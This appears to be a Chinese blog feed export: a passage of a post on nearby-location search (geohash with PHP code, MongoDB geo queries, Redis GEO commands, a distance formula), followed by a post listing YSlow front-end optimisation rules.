<p>这种方案的优点显而易见，仅用一个字符串保存经纬度信息，并且精度由字符串从头到尾的长度决定，可以方便索引。</p>
<p>但这种方案的缺点是：从geohash的编码算法中可以看出，靠近每个方块边界两侧的点虽然十分接近，但所属的编码会完全不同。实际应用中，虽然可以通过去搜索环绕当前方块周围的8个方块来解决该问题，但一下子将原来只需要1次SQL查询变成了需要查询9次，这样不仅增大了查询量，也将原本简单的方案复杂化了。除此之外，这个方案也无法直接得到距离，需要程序协助进行后续的排序计算。</p>
<p><strong>geohash的编码算法</strong></p>
<p>成都永丰立交经纬度(30.63578,104.031601)</p>
<p>1)、纬度范围(-90, 90)平分成两个区间(-90, 0)、(0, 90)， 如果目标纬度位于前一个区间，则编码为0，否则编码为1。</p>
<p>由于30.625265属于(0, 90)，所以取编码为1。</p>
<p>然后再将(0, 90)分成 (0, 45), (45, 90)两个区间，而39.92324位于(0, 45)，所以编码为0</p>
<p>然后再将(0, 45)分成 (0, 22.5), (22.5, 45)两个区间，而39.92324位于(22.5, 45)，所以编码为1</p>
<p>依次类推可得永丰立交纬度编码为101010111001001000100101101010。</p>
<p>2)、经度也用同样的算法，对(-180, 180)依次细分，(-180，0)、(0,180) 得出编码110010011111101001100000000000</p>
<p>3)、合并经纬度编码，从高到低，先取一位经度，再取一位纬度；得出结果 111001001100011111101011100011000010110000010001010001000100</p>
<p>4)、用0-9、b-z（去掉a, i, l, o）这32个字母进行base32编码，得到(30.63578,104.031601)的编码为wm3yr31d2524。</p>
<p>11100 10011 00011 11110 10111 00011 00001 01100 00010 00101 00010 00100 =&gt; <a href="http://geohash.org/wm3yr31d2524" target="_blank" rel="noopener">wm3yr31d2524</a></p>
<p>算法如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GeoHash</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Base32编码映射关系</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">const</span> DIGITS = [<span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>,</span><br><span class="line">        <span class="string">'9'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'p'</span>,</span><br><span class="line">        <span class="string">'q'</span>, <span class="string">'r'</span>, <span class="string">'s'</span>, <span class="string">'t'</span>, <span class="string">'u'</span>, <span class="string">'v'</span>, <span class="string">'w'</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 精确度，值越大越精准, 建议此处使用5的倍数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">const</span> MAX = <span class="number">40</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * GeoHash encode</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $lat</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $lng</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($lat, $lng)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>::base32_encode(<span class="keyword">self</span>::combine(<span class="keyword">self</span>::dec2bit($lat, <span class="number">-90</span>, <span class="number">90</span>), <span class="keyword">self</span>::dec2bit($lng, <span class="number">-180</span>, <span class="number">180</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * GeoHash decode</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $val</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $encode = <span class="keyword">self</span>::base32_decode($val);</span><br><span class="line">        <span class="keyword">list</span>($elat, $elng) = <span class="keyword">self</span>::spilt($encode);</span><br><span class="line">        <span class="keyword">return</span> [<span class="keyword">self</span>::bit2dec($elat, <span class="number">-90</span>, <span class="number">90</span>), <span class="keyword">self</span>::bit2dec($elng, <span class="number">-180</span>, <span class="number">180</span>)];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将十进制转换成二进制经纬度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> float $v 十进制经纬度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> float $l 左阈值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> float $r 右阈值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">dec2bit</span><span class="params">($v, $l, $r)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $s = <span class="string">''</span>;</span><br><span class="line">        $max = <span class="keyword">self</span>::MAX;</span><br><span class="line">        <span class="keyword">while</span> ($max--) &#123;</span><br><span class="line">            $mid = ($l + $r) / <span class="number">2</span>;</span><br><span class="line">            $d = $mid &gt; $v ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ($d) &#123;</span><br><span class="line">                $l = $mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $r = $mid;</span><br><span class="line">            &#125;</span><br><span class="line">            $s .= $d;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 经纬度编码值合并</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> int $elat 二进制维度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> int $elng 二进制经度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">combine</span><span class="params">($elat, $elng)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $c = <span class="string">''</span>;</span><br><span class="line">        $max = <span class="keyword">self</span>::MAX;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $max; $i++) &#123;</span><br><span class="line">            $c .= $elng[$i] . $elat[$i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * base32编码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $s 合并后的经纬度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">base32_encode</span><span class="params">($s)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $r = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($s); $i += <span class="number">5</span>) &#123;</span><br><span class="line">            $sub = str_pad(substr($s, $i, <span class="number">5</span>), <span class="number">5</span>, <span class="number">0</span>, STR_PAD_RIGHT);</span><br><span class="line">            $num = base_convert($sub,<span class="number">2</span>,<span class="number">10</span>);</span><br><span class="line">            $r .= <span class="keyword">self</span>::DIGITS[$num];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * base32解码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $s GeoHash.encode的值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">base32_decode</span><span class="params">($s)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $r = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($s); $i++) &#123;</span><br><span class="line">            $v = array_search($s[$i], <span class="keyword">self</span>::DIGITS);</span><br><span class="line">            $b = str_pad(base_convert($v, <span class="number">10</span>, <span class="number">2</span>), <span class="number">5</span>, <span class="number">0</span>, STR_PAD_LEFT);</span><br><span class="line">            $r .= $b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 经纬度拆分</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $s 将合并的经纬度拆出来</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">spilt</span><span class="params">($s)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $lat = <span class="string">''</span>;</span><br><span class="line">        $lng = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($s); $i += <span class="number">2</span>) &#123;</span><br><span class="line">            $lng .= $s[$i];</span><br><span class="line">            $lat .= $s[$i + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [$lat, $lng];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 二进制转换成十进制经纬度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> float $s 二进制经纬度</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> float $l 左阈值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> float $r 右阈值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> float|int|string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">bit2dec</span><span class="params">($s, $l, $r)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $k = <span class="string">''</span>;</span><br><span class="line">        $mid = ($l + $r) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($s); $i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($s[$i]) &#123;</span><br><span class="line">                $l = $mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $r = $mid;</span><br><span class="line">            &#125;</span><br><span class="line">            $mid = ($l + $r) / <span class="number">2</span>;</span><br><span class="line">            $k = $mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Testing</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$lat = <span class="number">30.63578</span>;</span><br><span class="line">$lng = <span class="number">104.031601</span>;</span><br><span class="line">var_dump(<span class="string">"初始值: $lat,$lng"</span>);</span><br><span class="line">var_dump(<span class="string">"编码后: "</span> . ($s = GeoHash::encode($lat, $lng)));</span><br><span class="line">var_dump(<span class="string">"解码后: "</span> . (implode(<span class="string">','</span>, GeoHash::decode($s))));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 输出</span></span><br><span class="line"><span class="comment">string(30) "初始值: 30.63578,104.031601"</span></span><br><span class="line"><span class="comment">string(27) "编码后: wm3yr31d252414ux"</span></span><br><span class="line"><span class="comment">string(41) "解码后: 30.63577999993,104.03160100012"</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="方案二：-MongoDB"><a href="#方案二：-MongoDB" class="headerlink" title="方案二： MongoDB"></a>方案二： MongoDB</h3><p>MongoDB原生支持地理位置索引，可以直接用于位置距离计算和查询。</p>
<p>另外，它也是如今最流行的NoSQL数据库之一，除了能够很好地支持地理位置计算之外，还拥有诸如面向集合存储、模式自由、高性能、支持复杂查询、支持完全索引等等特性。查询结果默认将会由近到远排序，而且查询结果也包含目标点对象、距离目标点的距离等信息。由于geoNear是MongoDB原生支持的查询函数，所以性能上也做到了高度的优化，完全可以应付生产环境的压力。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 插入数据</span></span><br><span class="line">db.location.insert(&#123;</span><br><span class="line">      "xian":"成都",</span><br><span class="line">      "sheng":"四川",</span><br><span class="line">      "center":&#123; "type":"Point","coordinates":[104.068433,30.659673]&#125;</span><br><span class="line">&#125;);</span><br><span class="line">db.location.insert(&#123;</span><br><span class="line">      "xian":"绵阳",</span><br><span class="line">      "sheng":"四川",</span><br><span class="line">      "center":&#123; "type":"Point","coordinates":[104.680961,31.473909]&#125;</span><br><span class="line">&#125;);</span><br><span class="line">db.location.insert(&#123;</span><br><span class="line">      "xian":"泸州",</span><br><span class="line">      "sheng":"四川",</span><br><span class="line">      "center":&#123; "type":"Point","coordinates":[105.450251,28.876403]&#125;</span><br><span class="line">&#125;);</span><br><span class="line">db.location.insert(&#123;</span><br><span class="line">      "xian":"德阳",</span><br><span class="line">      "sheng":"四川",</span><br><span class="line">      "center":&#123; "type":"Point","coordinates":[104.408441,31.134847]&#125;</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 创建 2dsphere索引</span></span><br><span class="line">db.location.createIndex(&#123;"center":"2dsphere"&#125;); # 或 db.location.ensureIndex( &#123; center : "2dsphere" &#125; )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询: 这种方法可以返回的由近及远的点，但是不能获取距离，支持分页查询</span></span><br><span class="line">db.location.find(&#123;</span><br><span class="line">  center:&#123;</span><br><span class="line">     $near:&#123;</span><br><span class="line">       $geometry:&#123;</span><br><span class="line">          type:"Point",</span><br><span class="line">          coordinates:[106.644153,30.452034]</span><br><span class="line">       &#125;,</span><br><span class="line">       $maxDistance: 500000 </span><br><span class="line">     &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;).limit(3);</span><br><span class="line"><span class="comment">/** 查询结果</span></span><br><span class="line"><span class="comment">&#123; "_id" : ObjectId("5f1e4e971a9a5bb3e50e17d3"), "xian" : "泸州", "sheng" : "四川", "center" : &#123; "type" : "Point", "coordinates" : [ 105.450251, 28.876403 ] &#125; &#125;</span></span><br><span class="line"><span class="comment">&#123; "_id" : ObjectId("5f1e4e971a9a5bb3e50e17d2"), "xian" : "绵阳", "sheng" : "四川", "center" : &#123; "type" : "Point", "coordinates" : [ 104.680961, 31.473909 ] &#125; &#125;</span></span><br><span class="line"><span class="comment">&#123; "_id" : ObjectId("5f1e4e991a9a5bb3e50e17d4"), "xian" : "德阳", "sheng" : "四川", "center" : &#123; "type" : "Point", "coordinates" : [ 104.408441, 31.134847 ] &#125; &#125;</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查询：这种方法更加灵活，可以返回距离，还可以指定查询条件等,但是不可以分页</span></span><br><span class="line"></span><br><span class="line">db.runCommand( &#123;</span><br><span class="line">   geoNear: "location" ,</span><br><span class="line">   near: &#123; </span><br><span class="line">      type: "Point" , </span><br><span class="line">      coordinates: [106.644153,30.452034]</span><br><span class="line">    &#125; ,</span><br><span class="line">   spherical: true,</span><br><span class="line">   limit:3</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 查询结果</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">        "results" : [</span></span><br><span class="line"><span class="comment">                &#123;</span></span><br><span class="line"><span class="comment">                        "dis" : 209998.53583992278,// 距离查询点距离，单位：米</span></span><br><span class="line"><span class="comment">                        "obj" : &#123;</span></span><br><span class="line"><span class="comment">                                "_id" : ObjectId("5f1e4e971a9a5bb3e50e17d3"),</span></span><br><span class="line"><span class="comment">                                "xian" : "泸州",</span></span><br><span class="line"><span class="comment">                                "sheng" : "四川",</span></span><br><span class="line"><span class="comment">                                "center" : &#123;</span></span><br><span class="line"><span class="comment">                                        "type" : "Point",</span></span><br><span class="line"><span class="comment">                                        "coordinates" : [</span></span><br><span class="line"><span class="comment">                                                105.450251,</span></span><br><span class="line"><span class="comment">                                                28.876403</span></span><br><span class="line"><span class="comment">                                        ]</span></span><br><span class="line"><span class="comment">                                &#125;</span></span><br><span class="line"><span class="comment">                        &#125;</span></span><br><span class="line"><span class="comment">                &#125;,</span></span><br><span class="line"><span class="comment">                &#123;</span></span><br><span class="line"><span class="comment">                        "dis" : 219215.02401424237,</span></span><br><span class="line"><span class="comment">                        "obj" : &#123;</span></span><br><span class="line"><span class="comment">                                "_id" : ObjectId("5f1e4e971a9a5bb3e50e17d2"),</span></span><br><span class="line"><span class="comment">                                "xian" : "绵阳",</span></span><br><span class="line"><span class="comment">                                "sheng" : "四川",</span></span><br><span class="line"><span class="comment">                                "center" : &#123;</span></span><br><span class="line"><span class="comment">                                        "type" : "Point",</span></span><br><span class="line"><span class="comment">                                        "coordinates" : [</span></span><br><span class="line"><span class="comment">                                                104.680961,</span></span><br><span class="line"><span class="comment">                                                31.473909</span></span><br><span class="line"><span class="comment">                                        ]</span></span><br><span class="line"><span class="comment">                                &#125;</span></span><br><span class="line"><span class="comment">                        &#125;</span></span><br><span class="line"><span class="comment">                &#125;,</span></span><br><span class="line"><span class="comment">                &#123;</span></span><br><span class="line"><span class="comment">                        "dis" : 226894.19044046788,</span></span><br><span class="line"><span class="comment">                        "obj" : &#123;</span></span><br><span class="line"><span class="comment">                                "_id" : ObjectId("5f1e4e991a9a5bb3e50e17d4"),</span></span><br><span class="line"><span class="comment">                                "xian" : "德阳",</span></span><br><span class="line"><span class="comment">                                "sheng" : "四川",</span></span><br><span class="line"><span class="comment">                                "center" : &#123;</span></span><br><span class="line"><span class="comment">                                        "type" : "Point",</span></span><br><span class="line"><span class="comment">                                        "coordinates" : [</span></span><br><span class="line"><span class="comment">                                                104.408441,</span></span><br><span class="line"><span class="comment">                                                31.134847</span></span><br><span class="line"><span class="comment">                                        ]</span></span><br><span class="line"><span class="comment">                                &#125;</span></span><br><span class="line"><span class="comment">                        &#125;</span></span><br><span class="line"><span class="comment">                &#125;</span></span><br><span class="line"><span class="comment">        ],</span></span><br><span class="line"><span class="comment">        "stats" : &#123;</span></span><br><span class="line"><span class="comment">                "nscanned" : 5,</span></span><br><span class="line"><span class="comment">                "objectsLoaded" : 4,</span></span><br><span class="line"><span class="comment">                "avgDistance" : 218702.58343154436,</span></span><br><span class="line"><span class="comment">                "maxDistance" : 226894.19044046788,</span></span><br><span class="line"><span class="comment">                "time" : 0</span></span><br><span class="line"><span class="comment">        &#125;,</span></span><br><span class="line"><span class="comment">        "ok" : 1</span></span><br><span class="line"><span class="comment">&#125;**/</span></span><br></pre></td></tr></table></figure>

<h3 id="方案三：-Redis"><a href="#方案三：-Redis" class="headerlink" title="方案三： Redis"></a>方案三： Redis</h3><p>自 Redis 3.2版 开始，Redis基于geohash和有序集合提供了地理位置相关功能。</p>
<p>Redis Geo模块的6个指令用途说明：</p>
<p><a href="https://www.redis.net.cn/" target="_blank" rel="noopener">https://www.redis.net.cn/</a></p>
<p><a href="http://redisdoc.com/script/eval.html" target="_blank" rel="noopener">http://redisdoc.com/script/eval.html</a></p>
<p>1）<strong>GEOADD</strong>：将给定的位置对象（纬度、经度、名字）添加到指定的key；</p>
<p>2）<strong>GEOPOS</strong>：从key里面返回所有给定位置对象的位置（经度和纬度）；</p>
<p>3）<strong>GEODIST</strong>：返回两个给定位置之间的距离；</p>
<p>4）<strong>GEOHASH</strong>：返回一个或多个位置对象的Geohash表示；</p>
<p>5）<strong>GEORADIUS</strong>：以给定的经纬度为中心，返回目标集合中与中心的距离不超过给定最大距离的所有位置对象；</p>
<p>6）<strong>GEORADIUSBYMEMBER</strong>：以给定的位置对象为中心，返回与其距离不超过给定最大距离的所有位置对象。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 插入数据</span><br><span class="line">GEOADD city 104.068433 30.659673 成都</span><br><span class="line">GEOADD city 104.680961 31.473909 绵阳</span><br><span class="line">GEOADD city 105.450251 28.876403 泸州</span><br><span class="line">GEOADD city 104.408441 31.134847 德阳</span><br><span class="line"></span><br><span class="line"># 查询 300公里内的城市 </span><br><span class="line">GEORADIUS city 106.644153 30.452034 300 km withdist asc</span><br><span class="line">1) 1) &quot;泸州&quot;</span><br><span class="line">   2) &quot;209.8239&quot;</span><br><span class="line">2) 1) &quot;绵阳&quot;</span><br><span class="line">   2) &quot;219.0328&quot;</span><br><span class="line">3) 1) &quot;德阳&quot;</span><br><span class="line">   2) &quot;226.7054&quot;</span><br><span class="line">4) 1) &quot;成都&quot;</span><br><span class="line">   2) &quot;247.7777&quot;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">通过Redis源码分析可以看出，Redis内部使用有序集合(zset)保存位置对象，有序集合中每个元素都是一个带位置的对象，元素的score值为其经纬度对应的52位的geohash值：</span><br><span class="line">1) double类型精度为52位；</span><br><span class="line">2) geohash是以base32的方式编码，52bits最高可存储10位geohash值，对应地理区域大小为0.6*0.6米的格子。换句话说经Redis geo转换过的位置理论上会有约0.3*1.414=0.424米的误差。</span><br><span class="line">3) 用 GEORADIUS 实现【查找附近的人】功能，时间复杂度为：O(N+log(M))。其中N为九宫格范围内的位置元素数量（要算距离）, M是指定层级格子的数量,log(M)是跳表结构中找到每个格子首元素的时间复杂度（这个过程一般会进行9次）</span><br></pre></td></tr></table></figure>

<h3 id="附录：两点距离算法"><a href="#附录：两点距离算法" class="headerlink" title="附录：两点距离算法"></a>附录：两点距离算法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 获取两点间的距离</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> float $latitude1 纬度1</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> float $longitude1 经度1</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> float $latitude2 纬度2</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> float $longitude2 经度2</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@param</span> string $unit 单位: Km/Mi</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@return</span> false|float</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">getDistanceBetweenPointsNew</span><span class="params">($latitude1, $longitude1, $latitude2, $longitude2, $unit = <span class="string">'Mi'</span>)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     $theta = $longitude1 - $longitude2;</span><br><span class="line">     $distance = (sin(deg2rad($latitude1)) * sin(deg2rad($latitude2))) + (cos(deg2rad($latitude1)) * cos(deg2rad($latitude2)) * cos(deg2rad($theta)));</span><br><span class="line">     $distance = acos($distance);</span><br><span class="line">     $distance = rad2deg($distance);</span><br><span class="line">     $distance = $distance * <span class="number">60</span> * <span class="number">1.1515</span>;</span><br><span class="line">     <span class="keyword">switch</span> (strtolower($unit)) &#123;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">'mi'</span>:</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         <span class="keyword">case</span> <span class="string">'km'</span> :</span><br><span class="line">             $distance = $distance * <span class="number">1.609344</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> (round($distance, <span class="number">2</span>));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>前端Yslow的23个优化原则</title>
    <url>/articles/%E5%89%8D%E7%AB%AFYslow%E7%9A%8423%E4%B8%AA%E4%BC%98%E5%8C%96%E5%8E%9F%E5%88%99/</url>
    <content><![CDATA[<p>最常遇见的前端优化问题。</p>
<p>Yslow是雅虎开发的基于网页性能分析浏览器插件，可以检测出网页的具体性能值，并且有著名的Yslow 23条优化规则:</p>
<h3 id="减少HTTP请求次数"><a href="#减少HTTP请求次数" class="headerlink" title="减少HTTP请求次数"></a>减少HTTP请求次数</h3><p>尽量合并图片、CSS、JS。比如加载一个页面，如果有5个css文件的话，那么会发出5次http请求，这样会让用户第一次访问你的页面的时候会长时间等待。而如果把这个5个文件合成一个的话，就只需要发出一次http请求，节省网络请求时间，加快页面的加载。</p>
<h3 id="使用CDN"><a href="#使用CDN" class="headerlink" title="使用CDN"></a>使用CDN</h3><p>网站上静态资源即css、js全都使用cdn分发，图片亦然。</p>
<h3 id="避免空的src和href"><a href="#避免空的src和href" class="headerlink" title="避免空的src和href"></a>避免空的src和href</h3><p>当link标签的href属性为空、script标签的src属性为空的时候，浏览器渲染的时候会把当前页面的URL作为它们的属性值，从而把页面的内容加载进来作为它们的值。所以要避免犯这样的疏忽。</p>
<h3 id="为文件头指定Expires"><a href="#为文件头指定Expires" class="headerlink" title="为文件头指定Expires"></a>为文件头指定Expires</h3><p>Exipres是用来设置文件的过期时间的，一般对css、js、图片资源有效。 他可以使内容具有缓存性，这样下回再访问同样的资源时就通过浏览器缓存区读取，不需要再发出http请求。如下例子：</p>
<h3 id="使用gzip压缩内容"><a href="#使用gzip压缩内容" class="headerlink" title="使用gzip压缩内容"></a>使用gzip压缩内容</h3><p>gzip能够压缩任何一个文本类型的响应，包括html，xml，json。大大缩小请求返回的数据量。</p>
<h3 id="把CSS放到顶部"><a href="#把CSS放到顶部" class="headerlink" title="把CSS放到顶部"></a>把CSS放到顶部</h3><p>网页上的资源加载时从上网下顺序加载的，所以css放在页面的顶部能够优先渲染页面，让用户感觉页面加载很快。</p>
<h3 id="把JS放到底部"><a href="#把JS放到底部" class="headerlink" title="把JS放到底部"></a>把JS放到底部</h3><p>加载js时会对后续的资源造成阻塞，必须得等js加载完才去加载后续的文件 ，所以就把js放在页面底部最后加载。</p>
<h3 id="避免使用CSS表达式"><a href="#避免使用CSS表达式" class="headerlink" title="避免使用CSS表达式"></a>避免使用CSS表达式</h3><p>举个css表达式的例子</p>
<p>font-color: expression( (new Date()).getHours()%3 ? “#FFFFFF” : “#AAAAAA” );</p>
<p>这个表达式会持续的在页面上计算样式，影响页面的性能。并且css表达式只被IE支持。</p>
<h3 id="将CSS和JS放到外部文件中"><a href="#将CSS和JS放到外部文件中" class="headerlink" title="将CSS和JS放到外部文件中"></a>将CSS和JS放到外部文件中</h3><p>目的是缓存文件，可以参考原则4。 但有时候为了减少请求，也会直接写到页面里，需根据PV和IP的比例权衡。</p>
<h3 id="权衡DNS查找次数"><a href="#权衡DNS查找次数" class="headerlink" title="权衡DNS查找次数"></a>权衡DNS查找次数</h3><p>减少主机名可以节省响应时间。但同时，需要注意，减少主机会减少页面中并行下载的数量。</p>
<p>IE浏览器在同一时刻只能从同一域名下载两个文件。当在一个页面显示多张图片时，IE 用户的图片下载速度就会受到影响。所以新浪会搞N个二级域名来放图片。</p>
<p>下面是新浪微博的图片域名，我们可以看到他有多个域名，这样可以保证这些不同域名能够同时去下载图片，而不用排队。不过如果当使用的域名过多时，响应时间就会慢，因为不用响应域名时间不一致。</p>
<h3 id="精简CSS和JS"><a href="#精简CSS和JS" class="headerlink" title="精简CSS和JS"></a>精简CSS和JS</h3><p>这里就涉及到css和js的压缩了。比如下面的新浪的一个css文件，把空格回车全部去掉，减少文件的大小。现在的压缩工具有很多，基本主流的前端构建工具都能进行css和js文件的压缩，如grunt，glup等。</p>
<h3 id="避免跳转"><a href="#避免跳转" class="headerlink" title="避免跳转"></a>避免跳转</h3><p>有种现象会比较坑爹，看起来没什么差别，其实多次了一次页面跳转。比如当URL本该有斜杠（/）却被忽略掉时。</p>
